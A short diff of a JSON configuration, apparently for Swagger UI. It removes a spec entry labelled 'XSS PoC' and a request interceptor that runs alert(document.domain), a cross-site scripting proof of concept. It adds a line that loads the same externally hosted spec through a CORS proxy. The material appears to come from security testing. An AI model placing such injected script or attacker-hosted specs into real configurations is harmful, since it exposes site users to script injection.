@@ -1,9 +1,3 @@
 {
-  "urls": [
-    {
-      "url": "https://justluthra.github.io/justluthra/swagger.json",
-      "name": "XSS PoC"
-    }
-  ],
-  "requestInterceptor": "function(request) { alert(document.domain); return request; }"
+  "url": "https://corsproxy.io/?https://justluthra.github.io/justluthra/swagger.json"
 }
